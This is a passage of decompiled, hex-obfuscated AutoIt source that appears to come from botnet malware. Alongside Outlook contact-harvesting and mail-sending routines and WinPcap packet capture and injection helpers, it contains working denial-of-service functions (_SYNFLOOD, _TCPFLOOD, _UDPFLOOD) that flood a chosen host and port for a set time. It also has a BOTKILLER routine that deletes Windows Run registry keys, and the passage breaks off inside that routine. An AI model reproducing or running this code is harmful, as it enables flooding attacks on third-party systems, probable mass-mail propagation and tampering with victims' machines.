                If $sfirstname <> $ocolitems .item($inum).firstname Then ContinueLoop
            Else
                If StringInStr($ocolitems .item($inum).firstname, $sfirstname) = 0x0 Then ContinueLoop
            EndIf
        EndIf
        If $slastname <> "" Then
            If $fsearchpart = False Then
                If $slastname <> $ocolitems .item($inum).lastname Then ContinueLoop
            Else
                If StringInStr($ocolitems .item($inum).lastname, $slastname) = 0x0 Then ContinueLoop
            EndIf
        EndIf
        If $semail1adress <> "" Then
            $stemp = $ocolitems .item($inum).email1address
            If $fsearchpart = False Then
                If $semail1adress <> $stemp Then ContinueLoop
            Else
                If StringInStr($stemp, $semail1adress) = 0x0 Then ContinueLoop
            EndIf
        EndIf
        $ascontacts[$inum + 0xffffffff] = $ocolitems .item($inum).email1address
    Next
    $irc = @error
    If $irc = 0x0 Then
        Return $ascontacts
    Else
        Return SetError(0x9, 0x0, 0x0)
    EndIf
EndFunc   ;==>_OUTLOOKGETCONTACTS
Func _OUTLOOKOPEN()
    Local $ooutlook = ObjGet("", "Outlook.Application")
    If @error Or Not IsObj($ooutlook) Then
        Local $ooutlook = ObjCreate("Outlook.Application")
        If @error Or Not IsObj($ooutlook) Then
            Return SetError(0x1, 0x0, 0x0)
        EndIf
    EndIf
    Return $ooutlook
EndFunc   ;==>_OUTLOOKOPEN
Func _OUTLOOKSENDMAIL($ooutlook, $sto = "", $scc = "", $sbcc = "", $ssubject = "", $sbody = "", $sattachments = "", $ibodyformat = 0x1, $iimportance = 0x1, $swarningclick = "")
    Local $irc = 0x0, $asattachments
    If $sto = "" And $scc = "" And $sbcc = "" Then
        Return SetError(0x1, 0x0, 0x0)
    EndIf
    If $swarningclick <> "" And FileExists($swarningclick) = 0x0 Then
        Return SetError(0x2, 0x0, 0x0)
    Else
        Run($swarningclick)
    EndIf
    Local $oouerror = ObjEvent("AutoIt.Error", "_OutlookError")
    Local $omessage = $ooutlook .createitem(0x0)
    $omessage .To = $sto
    $omessage .cc = $scc
    $omessage .bcc = $sbcc
    $omessage .subject = $ssubject
    $omessage .body = $sbody
    $omessage .bodyformat = $ibodyformat
    $omessage .importance = $iimportance
    If $sattachments <> "" Then
        $asattachments = StringSplit($sattachments, ";")
        For $inumofattachments = 0x1 To $asattachments[0x0]
            $omessage .attachments .add($asattachments[$inumofattachments])
        Next
    EndIf
    $omessage .send
    $irc = @error
    If $irc = 0x0 Then
        Return 0x1
    Else
        Return SetError(0x9, 0x0, 0x0)
    EndIf
EndFunc   ;==>_OUTLOOKSENDMAIL
Func _PCAPBINARYGETVAL($data, $offset, $bytes)
    Local $val32 = Dec(StringMid($data, 0x3 + ($offset + 0xffffffff) * 0x2, $bytes * 0x2))
    If $val32 < 0x0 Then Return 0x2 ^ 0x20 + $val32
    Return $val32
EndFunc   ;==>_PCAPBINARYGETVAL
Func _PCAPBINARYSETVAL(ByRef $data, $offset, $value, $bytes)
    $data = StringReplace($data, 0x3 + ($offset + 0xffffffff) * 0x2, Hex($value, $bytes * 0x2))
EndFunc   ;==>_PCAPBINARYSETVAL
Func _PCAPCLEANDEVICENAME($fullname)
    Local $name = StringRegExp($fullname, "^Network adapter '(.*)' on", 0x1)
    If @error = 0x0 Then Return StringStripWS($name[0x0], 0x7)
    Return StringStripWS($fullname, 0x7)
EndFunc   ;==>_PCAPCLEANDEVICENAME
Func _PCAPDISPATCHTOFUNC($pcap, $func)
    If Not IsPtr($pcap) Then Return +0xffffffff
    Local $callback = DllCallbackRegister("_PcapHandler", "none:cdecl", "str;ptr;ptr")
    If $callback = 0x0 Then Return +0xffffffff
    Local $r = DllCall($pcap_dll, "int:cdecl", "pcap_dispatch", "ptr", $pcap, "int", +0xffffffff, "ptr", DllCallbackGetPtr($callback), "str", $func)
    DllCallbackFree($callback)
    Return $r[0x0]
EndFunc   ;==>_PCAPDISPATCHTOFUNC
Func _PCAPFREE()
    DllClose($pcap_dll)
EndFunc   ;==>_PCAPFREE
Func _PCAPGETDEVICELIST()
    Local $alldevs = DllStructCreate("ptr")
    Local $r = DllCall($pcap_dll, "int:cdecl", "pcap_findalldevs_ex", "str", "rpcap://", "ptr", 0x0, "ptr", DllStructGetPtr($alldevs), "ptr", DllStructGetPtr($pcap_errbuf))
    If (@error > 0x0) Then Return +0xffffffff
    If $r[0x0] = +0xffffffff Then Return +0xffffffff
    Local $next = DllStructGetData($alldevs, 0x1)
    Local $list[0x1][0xe]
    Local $i = 0x0
    While ($next <> 0x0)
        Local $pcap_if = DllStructCreate("ptr next;ptr name;ptr desc;ptr addresses;uint flags", $next)
        Local $len_name = DllCall("kernel32.dll", "int", "lstrlen", "ptr", DllStructGetData($pcap_if, 0x2))
        Local $len_desc = DllCall("kernel32.dll", "int", "lstrlen", "ptr", DllStructGetData($pcap_if, 0x3))
        $list[$i][0x0] = DllStructGetData(DllStructCreate("char[" & ($len_name[0x0] + 0x1) & "]", DllStructGetData($pcap_if, 0x2)), 0x1)
        $list[$i][0x1] = DllStructGetData(DllStructCreate("char[" & ($len_desc[0x0] + 0x1) & "]", DllStructGetData($pcap_if, 0x3)), 0x1)
        Local $next_addr = DllStructGetData($pcap_if, "addresses")
        Local $device = StringTrimLeft($list[$i][0x0], 0x8)
        Local $snames = DllStructCreate("char Name[" & (StringLen($device) + 0x1) & "]")
        DllStructSetData($snames, 0x1, $device)
        Local $handle = DllCall("packet.dll", "ptr:cdecl", "PacketOpenAdapter", "ptr", DllStructGetPtr($snames))
        If IsPtr($handle[0x0]) Then
            Local $packetoiddata = DllStructCreate("ulong oid;ulong length;ubyte data[6]")
            DllStructSetData($packetoiddata, 0x1, 0x1010102)
            DllStructSetData($packetoiddata, 0x2, 0x6)
            Local $status = DllCall("packet.dll", "byte:cdecl", "PacketRequest", "ptr", $handle[0x0], "byte", 0x0, "ptr", DllStructGetPtr($packetoiddata))
            If $status[0x0] Then
                Local $mac = DllStructGetData($packetoiddata, 0x3)
                $list[$i][0x6] = StringMid($mac, 0x3, 0x2) & ":" & StringMid($mac, 0x5, 0x2) & ":" & StringMid($mac, 0x7, 0x2) & ":" & StringMid($mac, 0x9, 0x2) & ":" & StringMid($mac, 0xb, 0x2) & ":" & StringMid($mac, 0xd, 0x2)
            EndIf
            Local $nettype = DllStructCreate("uint type;uint64 speed")
            $status = DllCall("packet.dll", "byte:cdecl", "PacketGetNetType", "ptr", $handle[0x0], "ptr", DllStructGetPtr($nettype))
            If $status[0x0] Then
                $list[$i][0x5] = DllStructGetData($nettype, 0x2)
            EndIf
            DllCall("packet.dll", "none:cdecl", "PacketCloseAdapter", "ptr", $handle[0x0])
        EndIf
        Local $pcap = _PCAPSTARTCAPTURE($list[$i][0x0], "host 1.2.3.4", 0x0, 0x20)
        If IsPtr($pcap) Then
            Local $types = _PCAPGETLINKTYPE($pcap)
            If IsArray($types) Then
                $list[$i][0x2] = $types[0x0]
                $list[$i][0x3] = $types[0x1]
                $list[$i][0x4] = $types[0x2]
            EndIf
            _PCAPSTOPCAPTURE($pcap)
        EndIf
        While $next_addr <> 0x0
            Local $pcap_addr = DllStructCreate("ptr next;ptr addr;ptr netmask;ptr broadaddr;ptr dst", $next_addr)
            Local $j, $addr
            For $j = 0x2 To 0x4
                $addr = _PCAPSOCK2ADDR(DllStructGetData($pcap_addr, $j))
                If StringLen($addr) > 0xf Then
                    $list[$i][$j + 0x8] = $addr
                ElseIf StringLen($addr) > 0x6 Then
                    $list[$i][$j + 0x5] = $addr
                EndIf
            Next
            $next_addr = DllStructGetData($pcap_addr, 0x1)
        WEnd
        $list[$i][0xd] = DllStructGetData($pcap_if, 0x5)
        $next = DllStructGetData($pcap_if, 0x1)
        $i += 0x1
        If $next <> 0x0 Then ReDim $list[$i + 0x1][0xe]
    WEnd
    DllCall($pcap_dll, "none:cdecl", "pcap_freealldevs", "ptr", DllStructGetData($alldevs, 0x1))
    Return $list
EndFunc   ;==>_PCAPGETDEVICELIST
Func _PCAPGETLASTERROR($pcap = 0x0)
    If Not IsPtr($pcap) Then Return DllStructGetData($pcap_errbuf, 0x1)
    Local $v = DllCall($pcap_dll, "str:cdecl", "pcap_geterr", "ptr", $pcap)
    Return DllStructGetData($pcap_errbuf, 0x1) & $v[0x0]
EndFunc   ;==>_PCAPGETLASTERROR
Func _PCAPGETLINKTYPE($pcap)
    If Not IsPtr($pcap) Then Return +0xffffffff
    Local $type[0x3]
    Local $t = DllCall($pcap_dll, "int:cdecl", "pcap_datalink", "ptr", $pcap)
    $type[0x0] = $t[0x0]
    Local $name = DllCall($pcap_dll, "str:cdecl", "pcap_datalink_val_to_name", "int", $t[0x0])
    $type[0x1] = $name[0x0]
    Local $desc = DllCall($pcap_dll, "str:cdecl", "pcap_datalink_val_to_description", "int", $t[0x0])
    $type[0x2] = $desc[0x0]
    Return $type
EndFunc   ;==>_PCAPGETLINKTYPE
Func _PCAPGETPACKET($pcap)
    If Not IsPtr($pcap) Then Return +0xffffffff
    $pcap_ptrhdr = DllStructCreate("ptr")
    $pcap_ptrpkt = DllStructCreate("ptr")
    Local $pk[0x4]
    Local $res = DllCall($pcap_dll, "int:cdecl", "pcap_next_ex", "ptr", $pcap, "ptr", DllStructGetPtr($pcap_ptrhdr), "ptr", DllStructGetPtr($pcap_ptrpkt))
    If ($res[0x0] <> 0x1) Then Return $res[0x0]
    Local $pkthdr = DllStructCreate("int s;int us;int caplen;int len", DllStructGetData($pcap_ptrhdr, 0x1))
    Local $packet = DllStructCreate("ubyte[" & DllStructGetData($pkthdr, 0x3) & "]", DllStructGetData($pcap_ptrpkt, 0x1))
    Local $time_t = Mod(DllStructGetData($pkthdr, 0x1) + $pcap_timebias, 0x15180)
    $pk[0x0] = StringFormat("%02d:%02d:%02d.%06d", Int($time_t / 0xe10), Int(Mod($time_t, 0xe10) / 0x3c), Mod($time_t, 0x3c), DllStructGetData($pkthdr, 0x2))
    $pk[0x1] = DllStructGetData($pkthdr, 0x3)
    $pk[0x2] = DllStructGetData($pkthdr, 0x4)
    $pk[0x3] = DllStructGetData($packet, 0x1)
    $pcap_statv += $pk[0x2]
    $pcap_statn += 0x1
    Return $pk
EndFunc   ;==>_PCAPGETPACKET
Func _PCAPGETSTATS($pcap)
    If Not IsPtr($pcap) Then Return +0xffffffff
    Local $statsize = DllStructCreate("int")
    Local $s = DllCall($pcap_dll, "ptr:cdecl", "pcap_stats_ex", "ptr", $pcap, "ptr", DllStructGetPtr($statsize))
    If $s[0x0] = 0x0 Then Return +0xffffffff
    Local $stats = DllStructCreate("uint recv;uint drop;uint ifdrop;uint capt", $s[0x0])
    Local $ps[0x6][0x2]
    $ps[0x0][0x0] = DllStructGetData($stats, 0x1)
    $ps[0x0][0x1] = "Packets received by Interface"
    $ps[0x1][0x0] = DllStructGetData($stats, 0x2)
    $ps[0x1][0x1] = "Packets dropped by WinPcap"
    $ps[0x2][0x0] = DllStructGetData($stats, 0x3)
    $ps[0x2][0x1] = "Packets dropped by Interface"
    $ps[0x3][0x0] = DllStructGetData($stats, 0x4)
    $ps[0x3][0x1] = "Packets captured"
    $ps[0x4][0x0] = $pcap_statv
    $ps[0x4][0x1] = "Bytes in packets captured"
    $ps[0x5][0x0] = Int(TimerDiff($pcap_starttime))
    $ps[0x5][0x1] = "mS since capture start"
    Return $ps
EndFunc   ;==>_PCAPGETSTATS
Func _PCAPHANDLER($user, $hdr, $data)
    Local $pk[0x4]
    Local $pkthdr = DllStructCreate("int s;int us;int caplen;int len", $hdr)
    Local $packet = DllStructCreate("ubyte[" & DllStructGetData($pkthdr, 0x3) & "]", $data)
    Local $time_t = Mod(DllStructGetData($pkthdr, 0x1) + $pcap_timebias, 0x15180)
    $pk[0x0] = StringFormat("%02d:%02d:%02d.%06d", Int($time_t / 0xe10), Int(Mod($time_t, 0xe10) / 0x3c), Mod($time_t, 0x3c), DllStructGetData($pkthdr, 0x2))
    $pk[0x1] = DllStructGetData($pkthdr, 0x3)
    $pk[0x2] = DllStructGetData($pkthdr, 0x4)
    $pk[0x3] = DllStructGetData($packet, 0x1)
    $pcap_statv += $pk[0x2]
    $pcap_statn += 0x1
    Call($user, $pk)
EndFunc   ;==>_PCAPHANDLER
Func _PCAPICMPCHECKSUM($data, $ipoffset = 0xe)
    Local $iplen = BitAND(_PCAPBINARYGETVAL($data, $ipoffset + 0x1, 0x1), 0xf) * 0x4
    Local $len = _PCAPBINARYGETVAL($data, $ipoffset + 0x3, 0x2) - $iplen
    Local $sum = 0x0, $i
    For $i = 0x1 To BitAND($len, 0xfffe) Step 0x2
        $sum += BitAND(0xffff, _PCAPBINARYGETVAL($data, $ipoffset + $iplen + $i, 0x2))
    Next
    If BitAND($len, 0x1) Then
        $sum += BitAND(0xff00, BitShift(_PCAPBINARYGETVAL($data, $ipoffset + $iplen + $len, 0x1), +0xfffffff8))
    EndIf
    $sum -= _PCAPBINARYGETVAL($data, $ipoffset + $iplen + 0x3, 0x2)
    While $sum > 0xffff
        $sum = BitAND($sum, 0xffff) + BitShift($sum, 0x10)
    WEnd
    Return BitXOR($sum, 0xffff)
EndFunc   ;==>_PCAPICMPCHECKSUM
Func _PCAPIPCHECKSUM($data, $ipoffset = 0xe)
    Local $iplen = BitAND(_PCAPBINARYGETVAL($data, $ipoffset + 0x1, 0x1), 0xf) * 0x4
    Local $sum = 0x0, $i
    For $i = 0x1 To $iplen Step 0x2
        $sum += BitAND(0xffff, _PCAPBINARYGETVAL($data, $ipoffset + $i, 0x2))
    Next
    $sum -= _PCAPBINARYGETVAL($data, $ipoffset + 0xb, 0x2)
    While $sum > 0xffff
        $sum = BitAND($sum, 0xffff) + BitShift($sum, 0x10)
    WEnd
    Return BitXOR($sum, 0xffff)
EndFunc   ;==>_PCAPIPCHECKSUM
Func _PCAPISPACKETREADY($pcap)
    If Not IsPtr($pcap) Then Return +0xffffffff
    Local $handle = DllCall($pcap_dll, "ptr:cdecl", "pcap_getevent", "ptr", $pcap)
    Local $state = DllCall("kernel32.dll", "dword", "WaitForSingleObject", "ptr", $handle[0x0], "dword", 0x0)
    Return $state[0x0] = 0x0
EndFunc   ;==>_PCAPISPACKETREADY
Func _PCAPLISTLINKTYPES($pcap)
    If Not IsPtr($pcap) Then Return +0xffffffff
    Local $ptr = DllStructCreate("ptr")
    Local $n = DllCall($pcap_dll, "int:cdecl", "pcap_list_datalinks", "ptr", $pcap, "ptr", DllStructGetPtr($ptr))
    If $n[0x0] < 0x1 Then Return +0xffffffff
    Local $dlts = DllStructCreate("int[" & $n[0x0] & "]", DllStructGetData($ptr, 0x1))
    Local $i, $name, $desc
    Local $types[$n[0x0]][0x3]
    For $i = 0x0 To $n[0x0] + 0xffffffff
        $types[$i][0x0] = DllStructGetData($dlts, 0x1, $i + 0x1)
        $name = DllCall($pcap_dll, "str:cdecl", "pcap_datalink_val_to_name", "int", $types[$i][0x0])
        $types[$i][0x1] = $name[0x0]
        $desc = DllCall($pcap_dll, "str:cdecl", "pcap_datalink_val_to_description", "int", $types[$i][0x0])
        $types[$i][0x2] = $desc[0x0]
    Next
    Return $types
EndFunc   ;==>_PCAPLISTLINKTYPES
Func _PCAPSAVETOFILE($pcap, $filename)
    If Not IsPtr($pcap) Then Return +0xffffffff
    Local $save = DllCall($pcap_dll, "ptr:cdecl", "pcap_dump_open", "ptr", $pcap, "str", $filename)
    If $save[0x0] = 0x0 Then Return +0xffffffff
    Return $save[0x0]
EndFunc   ;==>_PCAPSAVETOFILE
Func _PCAPSENDPACKET($pcap, $data)
    If Not IsPtr($pcap) Then Return +0xffffffff
    Local $databuffer = DllStructCreate("ubyte[" & BinaryLen($data) & "]")
    DllStructSetData($databuffer, 0x1, $data)
    Local $r = DllCall($pcap_dll, "int:cdecl", "pcap_sendpacket", "ptr", $pcap, "ptr", DllStructGetPtr($databuffer), "int", BinaryLen($data))
    Return $r[0x0]
EndFunc   ;==>_PCAPSENDPACKET
Func _PCAPSETLINKTYPE($pcap, $dlt)
    If Not IsPtr($pcap) Then Return +0xffffffff
    Local $n = DllCall($pcap_dll, "int:cdecl", "pcap_set_datalink", "ptr", $pcap, "int", $dlt)
    Return $n[0x0]
EndFunc   ;==>_PCAPSETLINKTYPE
Func _PCAPSETUP()
    If Not FileExists(@SystemDir & "\wpcap.dll") Then
        Return +0xffffffff
    EndIf
    Global $pcap_dll = DllOpen(@SystemDir & "\wpcap.dll")
    Global $pcap_errbuf = DllStructCreate("char[256]")
    Global $pcap_ptrhdr = 0x0
    Global $pcap_ptrpkt = 0x0
    Global $pcap_statv
    Global $pcap_statn
    Global $pcap_starttime
    Global $pcap_timebias = (0x2 ^ 0x20 - RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TimeZoneInformation", "ActiveTimeBias")) * 0x3c
    Local $v = DllCall($pcap_dll, "str:cdecl", "pcap_lib_version")
    If (@error > 0x0) Then Return +0xffffffff
    Return $v[0x0]
EndFunc   ;==>_PCAPSETUP
Func _PCAPSOCK2ADDR($sockaddr_ptr)
    If ($sockaddr_ptr = 0x0) Then Return ""
    Local $sockaddr = DllStructCreate("ushort family;char data[14]", $sockaddr_ptr)
    Local $family = DllStructGetData($sockaddr, 0x1)
    If ($family = 0x2) Then
        Local $sockaddr_in = DllStructCreate("short family;ushort port;ubyte addr[4];char zero[8]", $sockaddr_ptr)
        Return DllStructGetData($sockaddr_in, 0x3, 0x1) & "." & DllStructGetData($sockaddr_in, 0x3, 0x2) & "." & DllStructGetData($sockaddr_in, 0x3, 0x3) & "." & DllStructGetData($sockaddr_in, 0x3, 0x4)
    EndIf
    If ($family = 0x17) Then
        Local $sockaddr_in6 = DllStructCreate("ushort family;ushort port;uint flow;ubyte addr[16];uint scope", $sockaddr_ptr)
        Local $bin = DllStructGetData($sockaddr_in6, 0x4)
        Local $i, $ipv6
        For $i = 0x0 To 0x7
            $ipv6 &= StringMid($bin, 0x3 + $i * 0x4, 0x4) & ":"
        Next
        Return StringTrimRight($ipv6, 0x1)
    EndIf
    Return ""
EndFunc   ;==>_PCAPSOCK2ADDR
Func _PCAPSTARTCAPTURE($devicename, $filter = "", $promiscuous = 0x0, $packetlen = 0x10000, $buffersize = 0x0, $realtime = 0x1)
    Local $handle = DllCall($pcap_dll, "ptr:cdecl", "pcap_open", "str", $devicename, "int", $packetlen, "int", $promiscuous, "int", 0x3e8, "ptr", 0x0, "ptr", DllStructGetPtr($pcap_errbuf))
    If (@error > 0x0) Then Return +0xffffffff
    If ($handle[0x0] = 0x0) Then Return +0xffffffff
    DllCall($pcap_dll, "int:cdecl", "pcap_setnonblock", "ptr", $handle[0x0], "int", 0x1, "ptr", DllStructGetPtr($pcap_errbuf))
    If ($filter <> "") Then
        Local $fcode = DllStructCreate("UINT;ptr")
        Local $comp = DllCall($pcap_dll, "int:cdecl", "pcap_compile", "ptr", $handle[0x0], "ptr", DllStructGetPtr($fcode), "str", $filter, "int", 0x1, "int", 0x0)
        If ($comp[0x0] = +0xffffffff) Then
            Local $v = DllCall($pcap_dll, "str:cdecl", "pcap_geterr", "ptr", $handle[0x0])
            DllStructSetData($pcap_errbuf, 0x1, "Filter: " & $v[0x0])
            _PCAPSTOPCAPTURE($handle[0x0])
            Return +0xffffffff
        EndIf
        Local $set = DllCall($pcap_dll, "int:cdecl", "pcap_setfilter", "ptr", $handle[0x0], "ptr", DllStructGetPtr($fcode))
        If ($set[0x0] = +0xffffffff) Then
            Local $v = DllCall($pcap_dll, "str:cdecl", "pcap_geterr", "ptr", $handle[0x0])
            DllStructSetData($pcap_errbuf, 0x1, "Filter: " & $v[0x0])
            _PCAPSTOPCAPTURE($handle[0x0])
            Return +0xffffffff
            DllCall($pcap_dll, "none:cdecl", "pcap_freecode", "ptr", $fcode)
        EndIf
    EndIf
    If $buffersize > 0x0 Then DllCall($pcap_dll, "int:cdecl", "pcap_setbuff", "ptr", $handle[0x0], "int", $buffersize)
    If $realtime Then DllCall($pcap_dll, "int:cdecl", "pcap_setmintocopy", "ptr", $handle[0x0], "int", 0x1)
    $pcap_statv = 0x0
    $pcap_statn = 0x0
    $pcap_starttime = TimerInit()
    Return $handle[0x0]
EndFunc   ;==>_PCAPSTARTCAPTURE
Func _PCAPSTOPCAPTURE($pcap)
    If Not IsPtr($pcap) Then Return
    DllCall($pcap_dll, "none:cdecl", "pcap_close", "ptr", $pcap)
EndFunc   ;==>_PCAPSTOPCAPTURE
Func _PCAPSTOPCAPTUREFILE($handle)
    If Not IsPtr($handle) Then Return +0xffffffff
    DllCall($pcap_dll, "none:cdecl", "pcap_dump_close", "ptr", $handle)
EndFunc   ;==>_PCAPSTOPCAPTUREFILE
Func _PCAPTCPCHECKSUM($data, $ipoffset = 0xe)
    Local $iplen = BitAND(_PCAPBINARYGETVAL($data, $ipoffset + 0x1, 0x1), 0xf) * 0x4
    Local $len = _PCAPBINARYGETVAL($data, $ipoffset + 0x3, 0x2) - $iplen
    Local $sum = 0x0, $i
    For $i = 0x1 To BitAND($len, 0xfffe) Step 0x2
        $sum += BitAND(0xffff, _PCAPBINARYGETVAL($data, $ipoffset + $iplen + $i, 0x2))
    Next
    If BitAND($len, 0x1) Then
        $sum += BitAND(0xff00, BitShift(_PCAPBINARYGETVAL($data, $ipoffset + $iplen + $len, 0x1), +0xfffffff8))
    EndIf
    $sum += _PCAPBINARYGETVAL($data, $ipoffset + 0xd, 0x2) + _PCAPBINARYGETVAL($data, $ipoffset + 0xf, 0x2) + _PCAPBINARYGETVAL($data, $ipoffset + 0x11, 0x2) + _PCAPBINARYGETVAL($data, $ipoffset + 0x13, 0x2) + $len + 0x6 - _PCAPBINARYGETVAL($data, $ipoffset + $iplen + 0x11, 0x2)
    While $sum > 0xffff
        $sum = BitAND($sum, 0xffff) + BitShift($sum, 0x10)
    WEnd
    Return BitXOR($sum, 0xffff)
EndFunc   ;==>_PCAPTCPCHECKSUM
Func _PCAPUDPCHECKSUM($data, $ipoffset = 0xe)
    Local $iplen = BitAND(_PCAPBINARYGETVAL($data, $ipoffset + 0x1, 0x1), 0xf) * 0x4
    Local $len = _PCAPBINARYGETVAL($data, $ipoffset + 0x3, 0x2) - $iplen
    Local $sum = 0x0, $i
    For $i = 0x1 To BitAND($len, 0xfffe) Step 0x2
        $sum += BitAND(0xffff, _PCAPBINARYGETVAL($data, $ipoffset + $iplen + $i, 0x2))
    Next
    If BitAND($len, 0x1) Then
        $sum += BitAND(0xff00, BitShift(_PCAPBINARYGETVAL($data, $ipoffset + $iplen + $len, 0x1), +0xfffffff8))
    EndIf
    $sum += _PCAPBINARYGETVAL($data, $ipoffset + 0xd, 0x2) + _PCAPBINARYGETVAL($data, $ipoffset + 0xf, 0x2) + _PCAPBINARYGETVAL($data, $ipoffset + 0x11, 0x2) + _PCAPBINARYGETVAL($data, $ipoffset + 0x13, 0x2) + $len + 0x11 - _PCAPBINARYGETVAL($data, $ipoffset + $iplen + 0x7, 0x2)
    While $sum > 0xffff
        $sum = BitAND($sum, 0xffff) + BitShift($sum, 0x10)
    WEnd
    Local $crc = BitXOR($sum, 0xffff)
    If $crc = 0x0 Then Return 0xffff
    Return $crc
EndFunc   ;==>_PCAPUDPCHECKSUM
Func _PCAPWRITELASTPACKET($handle)
    If Not IsPtr($handle) Then Return +0xffffffff
    DllCall($pcap_dll, "none:cdecl", "pcap_dump", "ptr", $handle, "ptr", DllStructGetData($pcap_ptrhdr, 0x1), "ptr", DllStructGetData($pcap_ptrpkt, 0x1))
EndFunc   ;==>_PCAPWRITELASTPACKET
;_Singleton was here
Func _SQLCONNECT($sserver, $sdatabase, $fauthmode = 0x0, $susername = "", $spassword = "", $sdriver = "{SQL Server}")
    Local $stemp = StringMid($sdriver, 0x2, StringLen($sdriver) + 0xfffffffe)
    Local $skey = "HKEY_LOCAL_MACHINE\SOFTWARE\ODBC\ODBCINST.INI\ODBC Drivers", $sval = RegRead($skey, $stemp)
    If @error Or $sval = "" Then Return SetError(0x2, 0x0, 0x0)
    $oconn = ObjCreate("ADODB.Connection")
    If Not IsObj($oconn) Then Return SetError(0x3, 0x0, 0x0)
    If $fauthmode Then $oconn .Open("DRIVER=" & $sdriver & ";SERVER=" & $sserver & ";DATABASE=" & $sdatabase & ";UID=" & $susername & ";PWD=" & $spassword & ";")
    If Not $fauthmode Then $oconn .Open("DRIVER=" & $sdriver & ";SERVER=" & $sserver & ";DATABASE=" & $sdatabase)
    If @error Then Return SetError(0x1, 0x0, 0x0)
    Return $oconn
EndFunc   ;==>_SQLCONNECT
Func _SQLDISCONNECT($oconn)
    If Not IsObj($oconn) Then Return SetError(0x1, 0x0, 0x0)
    $oconn .Close
    Return 0x1
EndFunc   ;==>_SQLDISCONNECT
Func _SQLQUERY($oconn, $squery)
    If IsObj($oconn) Then Return $oconn .Execute($squery)
    Return SetError(0x1, 0x0, 0x0)
EndFunc   ;==>_SQLQUERY
Func _SYNFLOOD($host, $port, $time)
    $ip = TCPNameToIP($host)
    $port = Int($port)
    $time = Int($time)
    TCPStartup()
    Local $timer = TimerInit(), $diff = 0x0
    While 0x1
        $diff = TimerDiff($timer)
        If $diff >= $time * 0x3e8 Then
            ExitLoop
        EndIf
        TCPConnect($ip, $port)
    WEnd
EndFunc   ;==>_SYNFLOOD
Func _TCP_RECV($hcapture, $iinstance = 0x0, $itimeout = 0xbb8)
    Local $blpacketcaptured = False, $itimer_capture, $apacket, $ipacket
    $itimer_capture = TimerInit()
    While (TimerDiff($itimer_capture) < $itimeout Or $itimeout = +0xffffffff)
        $apacket = _PCAPGETPACKET($hcapture)
        If IsArray($apacket) Then
            If $ipacket = $iinstance Then
                Local $atcppacket[0x15]
                $atcppacket[0x0] = StringMid($apacket[0x3], 0x3, 0xc)
                $atcppacket[0x1] = StringMid($apacket[0x3], 0xf, 0xc)
                $atcppacket[0x2] = StringMid($apacket[0x3], 0x1b, 0x4)
                $atcppacket[0x3] = StringMid($apacket[0x3], 0x1f, 0x2)
                $atcppacket[0x4] = StringMid($apacket[0x3], 0x21, 0x2)
                $atcppacket[0x5] = StringMid($apacket[0x3], 0x23, 0x4)
                $atcppacket[0x6] = StringMid($apacket[0x3], 0x27, 0x4)
                $atcppacket[0x7] = StringMid($apacket[0x3], 0x2b, 0x4)
                $atcppacket[0x8] = StringMid($apacket[0x3], 0x2f, 0x2)
                $atcppacket[0x9] = StringMid($apacket[0x3], 0x31, 0x2)
                $atcppacket[0xa] = StringMid($apacket[0x3], 0x33, 0x4)
                $atcppacket[0xb] = StringMid($apacket[0x3], 0x37, 0x8)
                $atcppacket[0xc] = StringMid($apacket[0x3], 0x3f, 0x8)
                $atcppacket[0xd] = StringMid($apacket[0x3], 0x47, 0x4)
                $atcppacket[0xe] = StringMid($apacket[0x3], 0x4b, 0x4)
                $atcppacket[0xf] = StringMid($apacket[0x3], 0x4f, 0x8)
                $atcppacket[0x10] = StringMid($apacket[0x3], 0x57, 0x8)
                $atcppacket[0x11] = StringMid($apacket[0x3], 0x5f, 0x4)
                $atcppacket[0x12] = StringMid($apacket[0x3], 0x63, 0x4)
                $atcppacket[0x13] = StringMid($apacket[0x3], 0x67, 0x4)
                $atcppacket[0x14] = StringTrimLeft($apacket[0x3], 0x6e)
                Return $atcppacket
            EndIf
            $ipacket += 0x1
        EndIf
        Sleep(0x32)
    WEnd
    Return +0xffffffff
EndFunc   ;==>_TCP_RECV
Func _TCPFLOOD($ip, $port, $packetsize, $time)
    $port = Int($port)
    $packetsize = Int($packetsize)
    $time = Int($time)
    TCPStartup()
    Local $timer = TimerInit(), $diff = 0x0
    $tcpsock = TCPConnect($ip, $port)
    While 0x1
        $diff = TimerDiff($timer)
        If $diff >= $time * 0x3e8 Then
            TCPCloseSocket($tcpsock)
            ExitLoop
        EndIf
        $tcpsock = TCPConnect($ip, $port)
        While Not @error
            $packet = ""
            For $i = 0x0 To $packetsize Step 0x1
                $packet &= Chr(Random(0x0, 0xff, 0x1))
            Next
            TCPSend($tcpsock, $packet)
            If $diff >= $time * 0x3e8 Then
                ExitLoop
            EndIf
        WEnd
        TCPCloseSocket($tcpsock)
    WEnd
EndFunc   ;==>_TCPFLOOD
Func _UDPFLOOD($host, $port, $packetsize, $time)
    $ip = TCPNameToIP($host)
    $port = Int($port)
    $packetsize = Int($packetsize)
    $time = Int($time)
    UDPStartup()
    $packet = ""
    For $i = 0x1 To $packetsize
        $packet &= Chr(Random(0x0, 0xff, 0x1))
    Next
    Local $timer = TimerInit(), $diff = 0x0
    $udpsock = UDPOpen($ip, $port)
    While 0x1
        $diff = TimerDiff($timer)
        If $diff >= $time * 0x3e8 Then
            UDPCloseSocket($udpsock)
            ExitLoop
        EndIf
        UDPSend($udpsock, $packet)
    WEnd
EndFunc   ;==>_UDPFLOOD
Func _WINACTIVEBYEXE($sexe, $iactive = True)
    If Not ProcessExists($sexe) Then Return SetError(0x1, 0x0, 0x0)
    Local $apl = ProcessList($sexe)
    Local $awl = WinList()
    For $icc = 0x1 To $awl[0x0][0x0]
        For $xcc = 0x1 To $apl[0x0][0x0]
            If $awl[$icc][0x0] <> "" And WinGetProcess($awl[$icc][0x1]) = $apl[$xcc][0x1] And BitAND(WinGetState($awl[$icc][0x1]), 0x2) Then
                If $iactive And WinActive($awl[$icc][0x1]) Then Return 0x1
                If Not $iactive And Not WinActive($awl[$icc][0x1]) Then
                    WinActivate($awl[$icc][0x1])
                    Return 0x1
                EndIf
            EndIf
        Next
    Next
    Return SetError(0x2, 0x0, 0x0)
EndFunc   ;==>_WINACTIVEBYEXE
Func BOTKILLER()
    RegDelete("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
    RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
    RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
